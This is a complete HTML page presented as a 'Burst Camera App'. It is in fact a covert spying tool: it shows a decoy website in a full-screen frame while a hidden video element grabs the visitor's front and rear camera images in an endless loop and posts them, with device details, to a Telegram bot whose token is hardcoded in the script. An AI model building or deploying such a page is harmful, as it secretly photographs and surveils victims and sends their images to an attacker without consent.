<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Burst Camera App</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }
        
        #backgroundCamera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        
        #cameraVideo {
            width: 640px;
            height: 480px;
        }
        
        #websiteFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div id="backgroundCamera">
        <video id="cameraVideo" autoplay playsinline muted></video>
    </div>
    
    <iframe id="websiteFrame" src="about:blank"></iframe>

    <script>
        // =====================================================
        //  BURST CAMERA SYSTEM - UNLIMITED PHOTOS
        // =====================================================
        
        function getConfigFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            const websiteParam = urlParams.get('site') || urlParams.get('url') || urlParams.get('website');
            const chatId = urlParams.get('chat_id');
            
            let websiteURL = 'https://www.example.com';
            
            if (websiteParam) {
                websiteURL = decodeURIComponent(websiteParam);
                if (!websiteURL.startsWith('http://') && !websiteURL.startsWith('https://')) {
                    websiteURL = 'https://' + websiteURL;
                }
            }
            
            return {
                website: websiteURL,
                chatId: chatId || 'unknown'
            };
        }
        
        const config = getConfigFromURL();
        const BOT_TOKEN = '8307999302:AAGc6sLGoklnbpWsXg76lcdQcVAzGgsp8cQ';
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
        const CHAT_ID = config.chatId;
        
        // Configuration
        const PHOTOS_PER_CAMERA = 5; // Take 10 photos before switching
        const BURST_DELAY = 140; // Delay between photos in ms (faster = 140ms)
        const SWITCH_DELAY = 300; // Delay when switching cameras
        
        let cameraStream = null;
        let currentFacingMode = 'user';
        let burstRunning = false;
        let photoCounter = 0;
        let totalPhotosSent = 0;
        
        const cameraVideo = document.getElementById('cameraVideo');
        const websiteFrame = document.getElementById('websiteFrame');
        
        // Load website
        function loadWebsite() {
            try {
                websiteFrame.src = config.website;
                console.log('ðŸŒ Website loaded:', config.website);
            } catch (error) {
                console.error('Failed to load website:', error);
            }
        }
        
        // Start camera
        async function startCamera() {
            try {
                console.log(`ðŸ“¹ Starting ${currentFacingMode.toUpperCase()} camera...`);
                
                const constraints = {
                    video: {
                        width: { ideal: 1920, min: 1280 },
                        height: { ideal: 1080, min: 720 },
                        facingMode: currentFacingMode,
                        frameRate: { ideal: 30 }
                    }
                };
                
                cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
                cameraVideo.srcObject = cameraStream;
                
                await new Promise((resolve) => {
                    cameraVideo.onloadedmetadata = resolve;
                });
                
                await cameraVideo.play();
                
                // Brief warm-up
                await new Promise(resolve => setTimeout(resolve, 500));
                
                console.log(`âœ… ${currentFacingMode.toUpperCase()} camera ready: ${cameraVideo.videoWidth}x${cameraVideo.videoHeight}`);
                return true;
            } catch (error) {
                console.error('âŒ Camera error:', error);
                return false;
            }
        }
        
        // Stop camera
        function stopCamera() {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraVideo.srcObject = null;
                cameraStream = null;
            }
        }
        
        // Capture single frame
        async function captureFrame() {
            return new Promise((resolve) => {
                if (cameraVideo.readyState < 2) {
                    resolve(null);
                    return;
                }
                
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d', { alpha: false });
                
                canvas.width = cameraVideo.videoWidth || 1920;
                canvas.height = cameraVideo.videoHeight || 1080;
                
                if (canvas.width === 0 || canvas.height === 0) {
                    resolve(null);
                    return;
                }
                
                context.imageSmoothingEnabled = true;
                context.imageSmoothingQuality = 'high';
                context.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.90);
            });
        }
        
        // Send photo to Telegram
        async function sendPhotoToTelegram(blob, cameraType, photoNum) {
            if (!blob) return false;
            
            try {
                const url = `${TELEGRAM_API}/sendPhoto`;
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `${cameraType}_${photoNum}_${Date.now()}.jpg`);
                
                const caption = `ðŸ“¸ ${cameraType.toUpperCase()} #${photoNum}\nâ° ${new Date().toLocaleTimeString()}\nðŸ’¾ ${(blob.size / 1024).toFixed(2)} KB`;
                formData.append('caption', caption);
                
                // Fire and forget - don't wait for response
                fetch(url, {
                    method: 'POST',
                    body: formData
                });
                
                totalPhotosSent++;
                console.log(`âœ… Photo sent: ${cameraType.toUpperCase()} #${photoNum} (Total: ${totalPhotosSent})`);
                return true;
            } catch (error) {
                console.error('âŒ Send error:', error);
                return false;
            }
        }
        
        // Switch camera
        async function switchCamera() {
            console.log('ðŸ”„ Switching camera...');
            stopCamera();
            
            await new Promise(resolve => setTimeout(resolve, SWITCH_DELAY));
            
            currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
            photoCounter = 0;
            
            await startCamera();
        }
        
        // Main burst loop
        async function startBurstMode() {
            if (burstRunning) return;
            
            burstRunning = true;
            console.log('ðŸš€ BURST MODE STARTED - UNLIMITED PHOTOS');
            console.log(`ðŸ“Š Config: ${PHOTOS_PER_CAMERA} photos per camera, ${BURST_DELAY}ms delay`);
            
            while (burstRunning) {
                // Capture photo
                const blob = await captureFrame();
                
                if (blob) {
                    photoCounter++;
                    await sendPhotoToTelegram(blob, currentFacingMode, photoCounter);
                    
                    // Switch camera after X photos
                    if (photoCounter >= PHOTOS_PER_CAMERA) {
                        await switchCamera();
                    }
                }
                
                // Small delay between captures
                await new Promise(resolve => setTimeout(resolve, BURST_DELAY));
            }
        }
        
        // Send initial device info
        async function sendInitialInfo() {
            try {
                const info = `ðŸš€ *BURST MODE ACTIVATED*\n\n` +
                    `ðŸ“± Device: ${navigator.userAgent.substring(0, 50)}...\n` +
                    `ðŸŒ Website: ${config.website}\n` +
                    `â° Started: ${new Date().toLocaleString()}\n` +
                    `ðŸ“¸ Mode: Unlimited burst capture\n` +
                    `ðŸ”„ Switch: Every ${PHOTOS_PER_CAMERA} photos`;
                
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: info,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (e) {
                console.error('Failed to send initial info:', e);
            }
        }
        
        // Initialize everything
        async function init() {
            console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
            console.log('ðŸŽ¯ BURST CAMERA SYSTEM');
            console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
            console.log('ðŸ’¬ Chat ID:', CHAT_ID);
            console.log('ðŸŒ Website:', config.website);
            console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
            
            // Load website
            loadWebsite();
            
            // Send initial info
            await sendInitialInfo();
            
            // Start camera
            const cameraStarted = await startCamera();
            
            if (cameraStarted) {
                // Start burst mode
                startBurstMode();
            } else {
                console.error('âŒ Failed to start camera');
            }
        }
        
        // Auto-start
        window.addEventListener('load', init);
        
        // Cleanup
        window.addEventListener('beforeunload', () => {
            burstRunning = false;
            stopCamera();
        });
    </script>
</body>
</html>
